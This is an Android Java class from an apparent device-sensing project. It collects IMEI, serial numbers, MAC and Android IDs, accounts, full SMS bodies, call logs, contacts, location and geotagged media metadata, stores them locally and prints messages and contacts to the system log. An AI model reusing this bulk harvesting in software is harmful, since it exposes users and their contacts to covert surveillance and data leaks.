package com.ezeia.devicesensing.utils;

import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.Context;
import android.database.Cursor;
import android.os.Handler;
import android.provider.MediaStore;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import com.ezeia.devicesensing.LogsUtil;
import com.ezeia.devicesensing.SqliteRoom.Database.AppDatabase;
import com.ezeia.devicesensing.SqliteRoom.utils.DatabaseInitializer;
import com.ezeia.devicesensing.pref.Preference;
import com.ezeia.devicesensing.utils.CellTower.CellTowerStateListener;
import com.ezeia.devicesensing.utils.Location.DeviceLoc;
import com.ezeia.devicesensing.utils.Location.GPSTracker;
import com.ezeia.devicesensing.utils.Location.LocationFetch;
import com.google.gson.JsonArray;
import com.google.gson.JsonObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.RandomAccessFile;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Timer;
import java.util.TimerTask;
import java.util.regex.Pattern;

import static android.content.Context.TELEPHONY_SERVICE;

public class Functions
{
    private final Context ctx;
    private final String TAG = "DATA ITEMS";

    public Functions(Context ctx)
    {
        this.ctx = ctx;
    }

    //done
    public void primaryKeyData()
    {
        String IMEI =  CommonFunctions.getDeviceID(ctx);
        String DeviceSerialID = CommonFunctions.getDeviceSerialID();
        Log.i(TAG,"IMEI: "+IMEI);
        Log.i(TAG,"DEVICE SERIAL ID: "+DeviceSerialID);

        JsonObject object = new JsonObject();
        object.addProperty("IMEI",IMEI);
        object.addProperty("Device_SerialID",DeviceSerialID);
        DatabaseInitializer.addData(AppDatabase.getAppDatabase(ctx),"PrimaryData",object.toString(), CommonFunctions.fetchDateInUTC());
    }

    //done
    public void collectedUponChange()
    {
        LinkedHashMap<String,String> hmapDevice = new LinkedHashMap<>();

        String IMEI =  CommonFunctions.getDeviceID(ctx);
        String DeviceSerialID = CommonFunctions.getDeviceSerialID();

        String versionAndModel = CommonFunctions.getDeviceModelAndVersion();
        String model = versionAndModel.split(Pattern.quote("^"))[0];
        String version = versionAndModel.split(Pattern.quote("^"))[1];
        Log.d(TAG,"VERSION: "+version+" MODEL: "+model);

        String androidID = CommonFunctions.getAndroidID(ctx);
        Log.d(TAG,"ANDROID ID: "+androidID);

        String deviceMAC = CommonFunctions.getDeviceMACAddress(ctx);
        Log.d(TAG,"DEVICE MAC ADDRESS: "+deviceMAC);

        LinkedHashMap<String,String> serviceProvider = CommonFunctions.getNetwrkProvider(ctx);
        Log.d(TAG,"SERVICE PROVIDER:\n "+serviceProvider);

        hmapDevice.put("IMEI",IMEI);
        hmapDevice.put("Device Serial Id",DeviceSerialID);
        hmapDevice.put("Model",model);
        hmapDevice.put("Version",version);
        hmapDevice.put("Android Id",androidID);
        hmapDevice.put("Device MAC",deviceMAC);

        createJsonReportDeviceInfo(hmapDevice,serviceProvider);
    }

    public void collectedUponUsage()
    {
        // 1. Screen On/Off Broadcast done
        // 2. App Install/Uninstall Broadcast done
        // 3. App Open Close **
        // 4. Crash **
        // 5. Accelerometer Sensor (add)
        // 6. Temp sensor (add)
        // 7. Proximity sensor (not imp)
        // 8. Bluetooth
        // 9. wifi
        // 10. cell tower connection Broadcast
        // 11. Accounts
        // 12. Audio
        // 13. Video
        // 14. Image
        // 15. Call
        // 16. Sms
        // 17. Front/back camera **

        LinkedHashMap<String,String> accountID=CommonFunctions.getAccountInfo(ctx);
        Log.d(TAG,"ACCOUNT INFO:\n "+accountID);

        createJsonReportAccount(accountID);

        getAudioFilesInfo();

        List<String> listVideo = getVideoFilesInfo(ctx);
        StringBuilder stringBuffer1 = new StringBuilder();
        for(String video : listVideo)
        {
            stringBuffer1.append(video).append("\n\n");
        }
        Log.d(TAG,"VIDEO FILES:\n "+stringBuffer1);

        List<String> listImage = getImagesFilesInfo();
        StringBuilder stringBuffer2 = new StringBuilder();
        for(String image : listImage)
        {
            stringBuffer2.append(image).append("\n\n");
        }
        Log.d(TAG,"IMAGE FILES:\n "+stringBuffer2);

        StringBuffer buffer = CommonFunctions.getCallDetails(ctx);
        Log.d(TAG,"CALL DETAILS:\n "+buffer);

        List<Sms> listSms= CommonFunctions.getAllSms(ctx);
        StringBuilder bufferSms= new StringBuilder();
        for(int i=0;i<listSms.size();i++)
        {
            bufferSms.append(listSms.get(i).getId()).append("--").append(listSms.get(i).getAddress()).append("--")
                    .append(listSms.get(i).getTime()).append("--").append(listSms.get(i).getBody())
                    .append("--").append(listSms.get(i).getFolderName()).append("--").append(listSms.get(i).getLocked())
                    .append("--").append(listSms.get(i).getMsg()).append("--").append(listSms.get(i).getPerson())
                    .append("--").append(listSms.get(i).getProtocol()).append("--").append(listSms.get(i).getReadState())
                    .append("--").append(listSms.get(i).getReplyPath()).append("--").append(listSms.get(i).getServiceCenter())
                    .append("--").append(listSms.get(i).getStatus()).append("--").append(listSms.get(i).getSubject())
                    .append("--").append(listSms.get(i).getType()).append("\n");
        }
        Log.d(TAG,"SMS LOGS:\n "+bufferSms);

        StringBuffer contacts = CommonFunctions.getContactList(ctx);
        Log.d(TAG,"CONTACTS:\n "+contacts);

    }

    public void collectedWithActivity()
    {
        // 1. Time
        // 2. Location (Lat/Long)
        StringBuffer bufferServices = CommonFunctions.isServiceRunning(ctx);
        //Log.i(TAG,"SERVICES RUNNING:\n "+bufferServices);

        //JsonObject buffer = getLocationCoordinates(ctx);
        //Log.i(TAG,"LOCATION:\n "+buffer.toString());

    }

    public JsonObject fetchLocation(){

        GPSTracker gpstracker=new GPSTracker(ctx);
        double latitude=gpstracker.getLatitude();
        double longitude=gpstracker.getLongitude();
        double altitude = gpstracker.getAltitude();
        double accuracy = gpstracker.getAccuracy();
        double speed = gpstracker.getSpeed();
        double bearing = gpstracker.getBearing();
        boolean hasAccuracy = gpstracker.isHasAccuracy();
        boolean hasAltitude = gpstracker.isHasAltitude();
        boolean hasSpeed = gpstracker.isHasSpeed();
        boolean hasBearing = gpstracker.isHasBearing();
        boolean isFromMockProvider = gpstracker.isFromMockProvider();
        String provider = gpstracker.getProvider();
        double elapsedTime = gpstracker.getElapsedTime();

        Log.i(TAG,"LOCATION:\n "+latitude+"--"+longitude);

        JsonObject object = new JsonObject();
        object.addProperty("Latitude",latitude);
        object.addProperty("Longitude",longitude);
        object.addProperty("Altitude",altitude);
        object.addProperty("Accuracy",accuracy);
        object.addProperty("Speed",speed);
        object.addProperty("Bearing",bearing);
        object.addProperty("Has Accuracy",hasAccuracy);
        object.addProperty("Has Altitude",hasAltitude);
        object.addProperty("Has Speed",hasSpeed);
        object.addProperty("Has Bearing",hasBearing);
        object.addProperty("Is From Mock Provider",isFromMockProvider);
        object.addProperty("Provider",provider);
        object.addProperty("Elapsed Time",elapsedTime);
        object.addProperty("Timestamp",CommonFunctions.fetchDateInUTC());

        return object;
    }

    public void collectedWithReport()
    {
        // 1. Memory usage
        // 2. battery (add)
        // 3. cpu utilization (add)
        // 4. time

     /*   Timer t = new Timer();
        t.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                    TelephonyManager mTelephonyManager = (TelephonyManager) ctx.getSystemService(TELEPHONY_SERVICE);
                    mTelephonyManager.listen(new CellTowerStateListener(ctx), PhoneStateListener.LISTEN_SIGNAL_STRENGTHS);
            }
        }, 0, 30000);*/
        final Handler ha=new Handler();
        ha.postDelayed(new Runnable() {
            @Override
            public void run()
            {
                TelephonyManager mTelephonyManager = (TelephonyManager) ctx.getSystemService(TELEPHONY_SERVICE);
                mTelephonyManager.listen(new CellTowerStateListener(ctx), PhoneStateListener.LISTEN_SIGNAL_STRENGTHS);
            }
        }, 30000);


        long totalRamValue = CommonFunctions.totalRamMemorySize(ctx);
        long freeRamValue = CommonFunctions.freeRamMemorySize(ctx);
        long usedRamValue = totalRamValue - freeRamValue;
        //Log.i(TAG,"RAM USAGE:\n "+"TOTAL: "+CommonFunctions.formatSize(totalRamValue)+"'\nFREE: "+CommonFunctions.formatSize(freeRamValue)
                //+"\nUSED: "+CommonFunctions.formatSize(usedRamValue));

        JsonObject object = new JsonObject();
        object.addProperty("Total",CommonFunctions.formatSize(totalRamValue));
        object.addProperty("Free",CommonFunctions.formatSize(freeRamValue));
        object.addProperty("Used",CommonFunctions.formatSize(usedRamValue));
        object.addProperty("Timestamp",CommonFunctions.fetchDateInUTC());
        DatabaseInitializer.addData(AppDatabase.getAppDatabase(ctx),"RAM",object.toString(),CommonFunctions.fetchDateInUTC());

        long totalInternalValue = CommonFunctions.getTotalInternalMemorySize();
        long freeInternalValue = CommonFunctions.getAvailableInternalMemorySize();
        long usedInternalValue = totalInternalValue - freeInternalValue;
        //Log.i(TAG,"INTERNAL USAGE:\n "+"TOTAL: "+CommonFunctions.formatSize(totalInternalValue)+
               // "\nFREE: "+CommonFunctions.formatSize(freeInternalValue)+"\nUSED: "+CommonFunctions.formatSize(usedInternalValue));

        JsonObject objectInternal = new JsonObject();
        objectInternal.addProperty("Total",CommonFunctions.formatSize(totalInternalValue));
        objectInternal.addProperty("Free",CommonFunctions.formatSize(freeInternalValue));
        objectInternal.addProperty("Used",CommonFunctions.formatSize(usedInternalValue));
        objectInternal.addProperty("Timestamp",CommonFunctions.fetchDateInUTC());
        DatabaseInitializer.addData(AppDatabase.getAppDatabase(ctx),"Internal",objectInternal.toString(),CommonFunctions.fetchDateInUTC());

        long totalExternalValue = CommonFunctions.getTotalExternalMemorySize();
        long freeExternalValue = CommonFunctions.getAvailableExternalMemorySize();
        long usedExternalValue = totalExternalValue - freeExternalValue;
        //Log.i(TAG,"EXTERNAL USAGE:\n "+"TOTAL: "+CommonFunctions.formatSize(totalExternalValue)+"'\nFREE: "+
               // CommonFunctions.formatSize(freeExternalValue)+"\nUSED: "+CommonFunctions.formatSize(usedExternalValue));

        JsonObject objectExternal = new JsonObject();
        objectExternal.addProperty("Total",CommonFunctions.formatSize(totalExternalValue));
        objectExternal.addProperty("Free",CommonFunctions.formatSize(freeExternalValue));
        objectExternal.addProperty("Used",CommonFunctions.formatSize(usedExternalValue));
        objectExternal.addProperty("Timestamp",CommonFunctions.fetchDateInUTC());
        DatabaseInitializer.addData(AppDatabase.getAppDatabase(ctx),"External",objectExternal.toString(),CommonFunctions.fetchDateInUTC());

        StringBuffer bufferBattery = CommonFunctions.getBatteryInfo(ctx);
        //Log.i(TAG,"BATTERY:\n "+bufferBattery);

        /*for(int i = 0;i<getCpuUsageStatistic().length;i++)
        {
            Log.i(TAG,"Get CPU USAGE STATS: "+getCpuUsageStatistic()[i]);
        }*/
        Log.i(TAG,"Get CPU USAGE STATS: "+readUsage());
        //Log.i(TAG,"Get CPU UTILISATION: "+getCpuUtilisation());
    }

    public JsonObject getLocationCoordinates(Context ctx)
    {
        StringBuffer bufferLoc = new StringBuffer();
        LocationFetch fetch=new LocationFetch(ctx);
        DeviceLoc location = fetch.getLocation();
        Double latitude = location.getLatitude();
        Double longitude = location.getLongitude();
        Double altitude = location.getAltitude();
        Double accuracy = location.getAccuracy();
        Double speed = location.getSpeed();
        Double bearing = location.getBearing();

        Boolean hasAccuracy=location.getHasAccuracy();
        Boolean hasAltitude=location.getHasAltitude();
        Boolean hasSpeed=location.getHasSpeed();
        Boolean hasBearing=location.getHasBearing();
        Boolean isFromMockProvider=location.getIsFromMock();

        Long elapsedTime=location.getElapsedTime();
        Long time=location.getTime();

        String provider=location.getProvider();

        bufferLoc.append("LATITUDE: ").append(latitude)
                .append("\nLONGITUDE: ").append(longitude)
                .append("\nALTITUDE: ").append(altitude)
                .append("\nACCURACY: ").append(accuracy)
                .append("\nSPEED: ").append(speed)
                .append("\nBEARING: ").append(bearing)
                .append("\nHAS ACCURACY: ").append(hasAccuracy)
                .append("\nHAS ALTITUDE: ").append(hasAltitude)
                .append("\nHAS SPEED: ").append(hasSpeed)
                .append("\nHAS BEARING: ").append(hasBearing)
                .append("\nIS FROM MOCK PROVIDER: ").append(isFromMockProvider)
                .append("\nPROVIDER: ").append(provider)
                .append("\nELAPSED TIME: ").append(elapsedTime)
                .append("\nTIME: ").append(time);

        JsonObject object = new JsonObject();
        object.addProperty("Latitude",latitude);
        object.addProperty("Longitude",longitude);
        object.addProperty("Altitude",altitude);
        object.addProperty("Accuracy",accuracy);
        object.addProperty("Speed",speed);
        object.addProperty("Bearing",bearing);
        object.addProperty("Has Accuracy",hasAccuracy);
        object.addProperty("Has Altitude",hasAltitude);
        object.addProperty("Has Speed",hasSpeed);
        object.addProperty("Has Bearing",hasBearing);
        object.addProperty("Is From Mock Provider",isFromMockProvider);
        object.addProperty("Provider",provider);
        object.addProperty("Elapsed Time",elapsedTime);
        object.addProperty("Timestamp",CommonFunctions.fetchDateInUTC());

        //DatabaseInitializer.addData(AppDatabase.getAppDatabase(ctx),"Location",object.toString(),CommonFunctions.fetchDateInUTC());
        return object;
    }

    private float readUsage() {
        try {
            RandomAccessFile reader = new RandomAccessFile("/proc/stat", "r");
            String load = reader.readLine();
            String[] toks = load.split(" ");
            long idle1 = Long.parseLong(toks[5]);
            long cpu1 = Long.parseLong(toks[2]) + Long.parseLong(toks[3]) + Long.parseLong(toks[4])
                    + Long.parseLong(toks[6]) + Long.parseLong(toks[7]) + Long.parseLong(toks[8]);
            try {
                Thread.sleep(360);
            } catch (Exception e) {
                e.printStackTrace();
            }
            reader.seek(0);
            load = reader.readLine();
            reader.close();
            toks = load.split(" ");
            long idle2 = Long.parseLong(toks[5]);
            long cpu2 = Long.parseLong(toks[2]) + Long.parseLong(toks[3]) + Long.parseLong(toks[4])
                    + Long.parseLong(toks[6]) + Long.parseLong(toks[7]) + Long.parseLong(toks[8]);
            return (float) (cpu2 - cpu1) / ((cpu2 + idle2) - (cpu1 + idle1));
        } catch (IOException ex) {
            ex.printStackTrace();
        }
        return 0;
    }

    private int[] getCpuUsageStatistic() {

        String tempString = executeTop();

        tempString = tempString.replaceAll(",", "");
        tempString = tempString.replaceAll("User", "");
        tempString = tempString.replaceAll("System", "");
        tempString = tempString.replaceAll("IOW", "");
        tempString = tempString.replaceAll("IRQ", "");
        tempString = tempString.replaceAll("%", "");
        for (int i = 0; i < 10; i++) {
            tempString = tempString.replaceAll("  ", " ");
        }
        tempString = tempString.trim();
        String[] myString = tempString.split(" ");
        int[] cpuUsageAsInt = new int[myString.length];
        for (int i = 0; i < myString.length; i++) {
            myString[i] = myString[i].trim();
            cpuUsageAsInt[i] = Integer.parseInt(myString[i]);
        }
        return cpuUsageAsInt;
    }

    private String executeTop() {
        java.lang.Process p = null;
        BufferedReader in = null;
        String returnString = null;
        try {
            p = Runtime.getRuntime().exec("top -n 1");
            in = new BufferedReader(new InputStreamReader(p.getInputStream()));
            while (returnString == null || returnString.contentEquals("")) {
                returnString = in.readLine();
            }
        } catch (IOException e) {
            Log.e("executeTop", "error in getting first line of top");
            e.printStackTrace();
        } finally {
            try {
                in.close();
                p.destroy();
            } catch (IOException e) {
                Log.e("executeTop",
                        "error in closing and destroying top process");
                e.printStackTrace();
            }
        }
        return returnString;
    }

    private String getCpuUtilisation()
    {
        ProcessBuilder processBuilder;
        String Holder = "";
        String[] DATA = {"/system/bin/cat", "/proc/cpuinfo"};
        InputStream inputStream;
        Process process ;
        byte[] byteArry = new byte[1024];

        try{
            processBuilder = new ProcessBuilder(DATA);
            process = processBuilder.start();
            inputStream = process.getInputStream();
            while(inputStream.read(byteArry) != -1){
                Holder = Holder + new String(byteArry);
            }
            inputStream.close();
        } catch(IOException ex){
            ex.printStackTrace();
        }
        return Holder;
    }

    private void getAudioFilesInfo()
    {
        String selection = MediaStore.Audio.Media.DATA+ "=?";

        String[] projection = {
                MediaStore.Audio.AudioColumns._ID,
                MediaStore.Audio.AudioColumns.SIZE,
                MediaStore.Audio.AudioColumns.DISPLAY_NAME,
                MediaStore.Audio.AudioColumns.ALBUM,
                MediaStore.Audio.AudioColumns.ALBUM_ID,
                MediaStore.Audio.AudioColumns.ARTIST,
                MediaStore.Audio.AudioColumns.ARTIST_ID,
                MediaStore.Audio.AudioColumns.COMPOSER,
                MediaStore.Audio.AudioColumns.DATE_ADDED,
                MediaStore.Audio.AudioColumns.DATE_MODIFIED,
                MediaStore.Audio.AudioColumns.DURATION,
                MediaStore.Audio.AudioColumns.IS_ALARM,
                MediaStore.Audio.AudioColumns.IS_MUSIC,
                MediaStore.Audio.AudioColumns.IS_NOTIFICATION,
                MediaStore.Audio.AudioColumns.IS_RINGTONE,
                MediaStore.Audio.AudioColumns.MIME_TYPE,
                MediaStore.Audio.AudioColumns.TITLE,
                MediaStore.Audio.AudioColumns.TRACK,
                MediaStore.Audio.AudioColumns.YEAR
        };

        Cursor cursor = ctx.getContentResolver().query(
                MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
                projection,
                null,
                null,
                null);

        List<String> songs = new ArrayList<>();
        if(cursor != null)
        {
            JsonObject header = new JsonObject();
            JsonArray jsonArray = new JsonArray();
            while(cursor.moveToNext()){
                songs.add(cursor.getString(0) + "||" +
                        cursor.getString(1) + "||" +
                        cursor.getString(2) + "||" +
                        cursor.getString(3) + "||" +
                        cursor.getString(4) + "||" +
                        cursor.getString(5) + "||" +
                        cursor.getString(6) + "||" +
                        cursor.getString(7) + "||" +
                        cursor.getString(8) + "||" +
                        cursor.getString(9) + "||" +
                        cursor.getString(10) + "||" +
                        cursor.getString(11) + "||" +
                        cursor.getString(12) + "||" +
                        cursor.getString(13) + "||" +
                        cursor.getString(14) + "||" +
                        cursor.getString(15) + "||" +
                        cursor.getString(16) + "||" +
                        cursor.getString(17) + "||" +
                        cursor.getString(18));

                JsonObject person = new JsonObject();

                person.addProperty("ID", cursor.getString(0));
                person.addProperty("Size", cursor.getString(1));
                person.addProperty("Display Name", cursor.getString(2));
                person.addProperty("Album", cursor.getString(3));
                person.addProperty("Album ID", cursor.getString(4));
                person.addProperty("Artist", cursor.getString(5));
                person.addProperty("Artist ID", cursor.getString(6));
                person.addProperty("Composer", cursor.getString(7));
                person.addProperty("Date Added", cursor.getString(8));
                person.addProperty("Date Modified", cursor.getString(9));
                person.addProperty("Duration", cursor.getString(10));
                person.addProperty("Is_Alarm", cursor.getString(11));
                person.addProperty("Is_Music", cursor.getString(12));
                person.addProperty("Is_Notification", cursor.getString(13));
                person.addProperty("Is_Ringtone", cursor.getString(14));
                person.addProperty("MimeType", cursor.getString(15));
                person.addProperty("Title", cursor.getString(16));
                person.addProperty("Track", cursor.getString(17));
                person.addProperty("Year", cursor.getString(18));

                jsonArray.add(person);
            }
            //header.add("AudioFiles",jsonArray);
            //Log.i("JSON",header.toString());
            DatabaseInitializer.addData(AppDatabase.getAppDatabase(ctx),"AudioFiles",jsonArray.toString(), CommonFunctions.fetchDateInUTC());
            cursor.close();
        }
    }

    private List<String> getVideoFilesInfo(Context ctx)
    {
        String selection = MediaStore.Video.Media.DATA+ "=?";

        String[] projection = {
                MediaStore.Video.VideoColumns._ID,
                MediaStore.Video.VideoColumns.SIZE,
                MediaStore.Video.VideoColumns.ALBUM,
                MediaStore.Video.VideoColumns.ARTIST,
                MediaStore.Video.VideoColumns.DISPLAY_NAME,
                MediaStore.Video.VideoColumns.BOOKMARK,
                MediaStore.Video.VideoColumns.BUCKET_DISPLAY_NAME,
                MediaStore.Video.VideoColumns.BUCKET_ID,
                MediaStore.Video.VideoColumns.DATE_ADDED,
                MediaStore.Video.VideoColumns.DATE_MODIFIED,
                MediaStore.Video.VideoColumns.DATE_TAKEN,
                MediaStore.Video.VideoColumns.DURATION,
                MediaStore.Video.VideoColumns.IS_PRIVATE,
                MediaStore.Video.VideoColumns.LATITUDE,
                MediaStore.Video.VideoColumns.LONGITUDE,
                MediaStore.Video.VideoColumns.MIME_TYPE,
                MediaStore.Video.VideoColumns.MINI_THUMB_MAGIC,
                MediaStore.Video.VideoColumns.RESOLUTION,
                MediaStore.Video.VideoColumns.TITLE
        };

        Cursor cursor = ctx.getContentResolver().query(
                MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                projection,
                null,
                null,
                null);

        List<String> songs = new ArrayList<>();
        if(cursor != null)
        {

            JsonObject header = new JsonObject();
            JsonArray jsonArray = new JsonArray();
            while(cursor.moveToNext()){
                songs.add(cursor.getString(0) + "||" +
                        cursor.getString(1) + "||" +
                        cursor.getString(2) + "||" +
                        cursor.getString(3) + "||" +
                        cursor.getString(4) + "||" +
                        cursor.getString(5) + "||" +
                        cursor.getString(6) + "||" +
                        cursor.getString(7) + "||" +
                        cursor.getString(8) + "||" +
                        cursor.getString(9) + "||" +
                        cursor.getString(10) + "||" +
                        cursor.getString(11) + "||" +
                        cursor.getString(12) + "||" +
                        cursor.getString(13) + "||" +
                        cursor.getString(14) + "||" +
                        cursor.getString(15) + "||" +
                        cursor.getString(16) + "||" +
                        cursor.getString(17) + "||" +
                        cursor.getString(18));

                JsonObject person = new JsonObject();

                person.addProperty("ID", cursor.getString(0));
                person.addProperty("Size", cursor.getString(1));
                person.addProperty("Album", cursor.getString(2));
                person.addProperty("Artist", cursor.getString(3));
                person.addProperty("Display Name", cursor.getString(4));
                person.addProperty("Bookmark", cursor.getString(5));
                person.addProperty("Bucket Display Name", cursor.getString(6));
                person.addProperty("Bucket ID", cursor.getString(7));
                person.addProperty("Date Added", cursor.getString(8));
                person.addProperty("Date Modified", cursor.getString(9));
                person.addProperty("Date Taken", cursor.getString(10));
                person.addProperty("Duration", cursor.getString(11));
                person.addProperty("Is_Private", cursor.getString(12));
                person.addProperty("Latitude", cursor.getString(13));
                person.addProperty("Longitude", cursor.getString(14));
                person.addProperty("MimeType", cursor.getString(15));
                person.addProperty("MiniThumbMagic", cursor.getString(16));
                person.addProperty("Resolution", cursor.getString(17));
                person.addProperty("Title", cursor.getString(18));

                jsonArray.add(person);
            }
            //header.add("VideoFiles",jsonArray);
            DatabaseInitializer.addData(AppDatabase.getAppDatabase(ctx),"VideoFiles",jsonArray.toString(), CommonFunctions.fetchDateInUTC());
            //Log.i("JSON",header.toString());
            cursor.close();
        }
        return songs;
    }

    private List<String> getImagesFilesInfo()
    {
        String selection = MediaStore.Images.Media.DATA+ "=?";

        String[] projection = {
                MediaStore.Images.ImageColumns._ID,
                MediaStore.Images.ImageColumns.SIZE,
                MediaStore.Images.ImageColumns.DISPLAY_NAME,
                MediaStore.Images.ImageColumns.BUCKET_DISPLAY_NAME,
                MediaStore.Images.ImageColumns.BUCKET_ID,
                MediaStore.Images.ImageColumns.DATE_ADDED,
                MediaStore.Images.ImageColumns.DATE_MODIFIED,
                MediaStore.Images.ImageColumns.DATE_TAKEN,
                MediaStore.Images.ImageColumns.IS_PRIVATE,
                MediaStore.Images.ImageColumns.LATITUDE,
                MediaStore.Images.ImageColumns.LONGITUDE,
                MediaStore.Images.ImageColumns.MIME_TYPE,
                MediaStore.Images.ImageColumns.MINI_THUMB_MAGIC,
                MediaStore.Images.ImageColumns.TITLE,
                MediaStore.Images.ImageColumns.ORIENTATION,
                MediaStore.Images.ImageColumns.DESCRIPTION
        };

        Cursor cursor = ctx.getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection,
                null,
                null,
                null);

        List<String> songs = new ArrayList<>();
        if(cursor != null)
        {
            JsonObject header = new JsonObject();
            JsonArray jsonArray = new JsonArray();
            while(cursor.moveToNext()){
                songs.add(cursor.getString(0) + "||" +
                        cursor.getString(1) + "||" +
                        cursor.getString(2) + "||" +
                        cursor.getString(3) + "||" +
                        cursor.getString(4) + "||" +
                        cursor.getString(5) + "||" +
                        cursor.getString(6) + "||" +
                        cursor.getString(7) + "||" +
                        cursor.getString(8) + "||" +
                        cursor.getString(9) + "||" +
                        cursor.getString(10) + "||" +
                        cursor.getString(11) + "||" +
                        cursor.getString(12) + "||" +
                        cursor.getString(13) + "||" +
                        cursor.getString(14) + "||" +
                        cursor.getString(15));
                JsonObject person = new JsonObject();

                person.addProperty("ID", cursor.getString(0));
                person.addProperty("Size", cursor.getString(1));
                person.addProperty("Display Name", cursor.getString(2));
                person.addProperty("Bucket Display Name", cursor.getString(3));
                person.addProperty("Bucket ID", cursor.getString(4));
                person.addProperty("Date Added", cursor.getString(5));
                person.addProperty("Date Modified", cursor.getString(6));
                person.addProperty("Date Taken", cursor.getString(7));
                person.addProperty("Is_Private", cursor.getString(8));
                person.addProperty("Latitude", cursor.getString(9));
                person.addProperty("Longitude", cursor.getString(10));
                person.addProperty("MimeType", cursor.getString(11));
                person.addProperty("MiniThumbMagic", cursor.getString(12));
                person.addProperty("Title", cursor.getString(13));
                person.addProperty("Orientation", cursor.getString(14));
                person.addProperty("Description", cursor.getString(15));

                jsonArray.add(person);
            }
            //header.add("ImageFiles",jsonArray);
            //Log.i("JSON",header.toString());
            DatabaseInitializer.addData(AppDatabase.getAppDatabase(ctx),"ImageFiles",jsonArray.toString(), CommonFunctions.fetchDateInUTC());
            cursor.close();
        }
        return songs;
    }

    public void fetchUSageStats(Context ctx,String packageName)
    {
        UsageStatsManager lUsageStatsManager;
        long TimeInforground = 500 ;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
            lUsageStatsManager = (UsageStatsManager) ctx.getSystemService(Context.USAGE_STATS_SERVICE);

            /*List<UsageStats> lUsageStatsList = lUsageStatsManager.queryUsageStats
                    (UsageStatsManager.INTERVAL_DAILY,
                            System.currentTimeMillis()- TimeUnit.DAYS.toMillis(1),
                            System.currentTimeMillis()+ TimeUnit.DAYS.toMillis(1));*/

            long currTime = System.currentTimeMillis();
            long startTime = currTime - 1000 * 10; //querying past three hours

            List<UsageStats> lUsageStatsList = lUsageStatsManager.queryUsageStats
                    (UsageStatsManager.INTERVAL_DAILY,
                            startTime,
                            currTime);

            StringBuilder lStringBuilder = new StringBuilder();

          /*  for (UsageStats lUsageStats:lUsageStatsList)
            {
                lStringBuilder.append("USAGE STATS: PACKAGE NAME: ");
                lStringBuilder.append(lUsageStats.getPackageName());
                lStringBuilder.append(" -- ");
                lStringBuilder.append("LAST TIME USED: ");
                lStringBuilder.append(lUsageStats.getLastTimeUsed());
                lStringBuilder.append(" -- ");
                lStringBuilder.append("FOREGROUND TIME: ");
                lStringBuilder.append(lUsageStats.getTotalTimeInForeground());
                lStringBuilder.append(" -- ");
                lStringBuilder.append("FIRST TIMESTAMP: ");
                lStringBuilder.append(lUsageStats.getFirstTimeStamp());
                lStringBuilder.append(" -- ");
                lStringBuilder.append("LAST TIMESTAMP: ");
                lStringBuilder.append(lUsageStats.getLastTimeStamp());
                lStringBuilder.append("\r\n");
            }*/

            for (UsageStats lUsageStats : lUsageStatsList) {
                if (lUsageStats.getPackageName().toLowerCase().equals(packageName.toLowerCase())) {
                    Log.d(TAG, "PACKAGE: " + lUsageStats.getPackageName());
                    Log.d(TAG, "FIRST: " + lUsageStats.getFirstTimeStamp());
                    Log.d(TAG, "LAST: " + lUsageStats.getLastTimeStamp());
                    Log.d(TAG, "LAST TIME USED: " + lUsageStats.getLastTimeUsed());
                    break;
                }
            }

            if (lUsageStatsList != null) {
                for (UsageStats usageStats : lUsageStatsList) {
                    if (usageStats.getPackageName().toLowerCase().equals(packageName.toLowerCase())) {
                        TimeInforground = usageStats.getTotalTimeInForeground();

                        String PackageName = usageStats.getPackageName();
                        int minutes = (int) ((TimeInforground / (1000 * 60)) % 60);
                        int seconds = (int) (TimeInforground / 1000) % 60;
                        int hours = (int) ((TimeInforground / (1000 * 60 * 60)) % 24);

                        //LocalDateTime time = LocalDateTime.ofInstant(Instant.ofEpochSecond(TimeInforground), TimeZone
                                //.getDefault().toZoneId());

                        //Log.i("Foreground", "PackageName is" + PackageName + "Time is: " + hours + "h" + ":" + minutes + "m" + seconds + "s");
                        //Log.i("Foreground", "PackageName is" + PackageName + "Time is: " + time);
                    }
                }
            }
        }
    }

    private void createJsonReportAccount(LinkedHashMap<String,String> accountID)
    {
        JsonObject header = new JsonObject();
        JsonArray jsonArray = new JsonArray();
        if(accountID != null && accountID.size() > 0)
        {
            for(Map.Entry<String,String> entry : accountID.entrySet())
            {
                JsonObject person = new JsonObject();
                person.addProperty("name", entry.getKey());
                person.addProperty("type", entry.getValue());
                jsonArray.add(person);
            }
        }

        //header.add("accountDetails",jsonArray);
        //Log.i("JSON",header.toString());
        DatabaseInitializer.addData(AppDatabase.getAppDatabase(ctx),"Accounts",jsonArray.toString(), CommonFunctions.fetchDateInUTC());
    }

    private void createJsonReportDeviceInfo(LinkedHashMap<String,String> hmapDevice, LinkedHashMap<String,String> hmapProvider)
    {
        JsonObject jsonObject = new JsonObject();
        if(hmapDevice != null && hmapDevice.size() > 0)
        {
            for(Map.Entry<String,String> entry : hmapDevice.entrySet())
            {
               jsonObject.addProperty(entry.getKey(),entry.getValue());
            }
            JsonArray jsonArray = new JsonArray();
            JsonObject person = new JsonObject();
            for(Map.Entry<String,String> entry : hmapProvider.entrySet())
            {
                person.addProperty(entry.getKey(), entry.getValue());
            }
            jsonArray.add(person);
            jsonObject.add("ServiceProvider",jsonArray);
        }

        //header.add("device_Info",jsonObject);
        //Log.i("JSON",jsonObject.toString());
        DatabaseInitializer.addData(AppDatabase.getAppDatabase(ctx),"DeviceInfo",jsonObject.toString(), CommonFunctions.fetchDateInUTC());
        Preference.getInstance(ctx).put(Preference.Key.IS_DEVICE_INFO,true);
    }
}
